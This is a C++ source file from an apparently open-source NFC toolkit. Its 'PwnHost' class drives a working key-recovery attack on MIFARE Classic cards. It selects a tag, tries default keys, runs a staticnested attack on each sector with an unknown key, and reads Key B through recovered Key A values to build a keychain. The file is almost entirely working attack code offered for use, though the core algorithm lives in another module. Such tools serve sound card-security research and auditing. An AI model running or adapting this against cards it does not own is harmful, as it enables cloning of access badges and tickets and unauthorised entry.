// SPDX-License-Identifier: GPL-3.0
/*
 * Copyright (C) 2026-present, RedbeanW.
 * This file is part of the NFC++ open source project.
 */

#include "pwn_host.h"

#include "common/static_nested.h"
#include "utility.h"

namespace nfcpp {

using namespace mifare;
using namespace util;

std::set<std::uint64_t> PwnHost::run() {
    discover_tag();
    prepare();
    while (!m_sectors_unknown_key_a.empty()) {
        perform(*m_sectors_unknown_key_a.begin(), MifareKey::A);
    }
    while (!m_sectors_unknown_key_b.empty()) {
        perform(*m_sectors_unknown_key_b.begin(), MifareKey::B);
    }
    return m_keychain;
}

void PwnHost::discover_tag() {
    auto card = m_initiator.select_card();
    if (!card) {
        throw std::runtime_error("No tag found.");
    }

    std::println("ISO14443A-compatible tag selected:");
    std::println("    ATQA : {}", hex(card->atqa));
    std::println("    UID  : {}", hex(std::byteswap(card->nuid)));
    std::println("    SAK  : {}", hex(card->sak));

    m_card = *card;
}

void PwnHost::prepare() {
    // Test default keys
    const auto test_result = m_initiator.test_default_keys(
        m_card,
        m_args.type,
        m_args.user_keys,
        m_args.no_default_keys
    );

    // Try get one valid key
    auto valid_key =
        std::ranges::find_if(test_result, [](const SectorKey& skey) {
            return skey.key_a || skey.key_b;
        });
    if (valid_key == test_result.end()) {
        throw std::runtime_error(
            "At least 1 valid key is required to perform a staticnested "
            "attack."
        );
    }
    m_valid_key.type = valid_key->key_a ? MifareKey::A : MifareKey::B;
    m_valid_key.key  = valid_key->key_a ? *valid_key->key_a : *valid_key->key_b;
    m_valid_key.block = sector_to_block(valid_key->sector);

    // Determine the sectors to be attacked
    if (!m_args.target_sector || !m_args.target_key_type) {
        m_sectors_unknown_key_a =
            test_result
            | std::views::filter([](auto& skey) { return !skey.key_a; })
            | std::views::transform([](auto& skey) { return skey.sector; })
            | std::ranges::to<std::set>();
        m_sectors_unknown_key_b =
            test_result
            | std::views::filter([](auto& skey) { return !skey.key_b; })
            | std::views::transform([](auto& skey) { return skey.sector; })
            | std::ranges::to<std::set>();
        if (m_sectors_unknown_key_a.empty()
            && m_sectors_unknown_key_b.empty()) {
            std::println("It appears there are no sectors with unknown keys.");
        }
    } else {
        if (*m_args.target_key_type == MifareKey::A) {
            m_sectors_unknown_key_a.emplace(*m_args.target_sector);
        } else {
            m_sectors_unknown_key_b.emplace(*m_args.target_sector);
        }
    }

    // Fill the initial key chain
    for (auto& skey : test_result) {
        if (skey.key_a) m_keychain.emplace(*skey.key_a);
        if (skey.key_b) m_keychain.emplace(*skey.key_b);
    }

    // Attempt to read all unknown KeyBs (using KeyA).
    for (auto& skey : test_result) {
        if (skey.key_a) on_key_a_found(skey.sector, *skey.key_a);
    }

    std::println(
        "Using key {} from sector {} to exploit...",
        valid_key->key_a ? "A" : "B",
        valid_key->sector
    );
}

void PwnHost::perform(std::uint8_t target_sector, MifareKey target_key_type) {
    std::println("Attacking sector {}...", target_sector);
    auto result = static_nested::execute(
        m_initiator,
        m_card,
        m_valid_key.block,
        m_valid_key.type,
        m_valid_key.key,
        sector_to_block(target_sector),
        target_key_type,
        m_args.force_detect_distance
    );
    if (!result.success) {
        throw std::runtime_error("\r\033[2KNo valid key found.");
    }
    std::println(
        "\r\033[2KKey{} found, is {:012X}. ({} keys tested)",
        target_key_type == MifareKey::A ? "A" : "B",
        result.key,
        result.tested_key_count
    );
    auto& wait_to_erase = target_key_type == MifareKey::A
                            ? m_sectors_unknown_key_a
                            : m_sectors_unknown_key_b;
    wait_to_erase.erase(target_sector);
    on_new_key(result.key);
    if (target_key_type == MifareKey::A) {
        on_key_a_found(target_sector, result.key);
    }
};

std::optional<std::uint64_t>
PwnHost::try_read_key_b(std::uint64_t key_a, std::uint8_t sector) {
    if (!m_initiator.select_card(m_card.uid)) {
        throw std::runtime_error("Tag moved out.");
    }

    try {
        auto                block = sector_to_block(sector);
        MifareCrypto1Cipher cipher;

        // Convert to key block (+15 if Classic4K)
        if (block < 128) {
            block += 3;
        } else {
            block += 15;
        }

        m_initiator.auth(cipher, MifareKey::A, m_card, block, key_a, false);

        auto data = m_initiator.read(cipher, block);

        std::uint64_t ret{};
        std::memcpy(&ret, data.data() + data.size() - 6, 6);

        // Verify the key.
        if (!m_initiator.auth(cipher, MifareKey::B, m_card, block, ret, true)) {
            return std::nullopt;
        }

        return ret;
    } catch (const std::runtime_error& e) {
        // CRC may fail, so catch runtime_error.
        return std::nullopt;
    }
}

void PwnHost::on_new_key(std::uint64_t key) {
    MifareCrypto1Cipher cipher;
    auto impl = [&](std::set<std::uint8_t>& sectors, MifareKey key_type) {
        for (auto it = sectors.begin(); it != sectors.end();) {
            if (m_initiator.test_key(
                    cipher,
                    key_type,
                    m_card,
                    sector_to_block(*it),
                    key
                )) {
                std::println(
                    "This key is also Key{} of sector {}.",
                    key_type == MifareKey::A ? "A" : "B",
                    *it
                );
                m_keychain.emplace(key);
                it = sectors.erase(it);
            } else {
                it++;
            }
        }
    };
    impl(m_sectors_unknown_key_a, MifareKey::A);
    impl(m_sectors_unknown_key_b, MifareKey::B);
}

void PwnHost::on_key_a_found(std::uint8_t sector, std::uint64_t key) {
    if (m_sectors_unknown_key_b.contains(sector)) {
        if (auto key_b = try_read_key_b(key, sector)) {
            std::println(
                "KeyB in sector {} read successfully, is {:012X}. (using "
                "KeyA).",
                sector,
                *key_b
            );
            on_new_key(*key_b);
        }
    }
}

} // namespace nfcpp
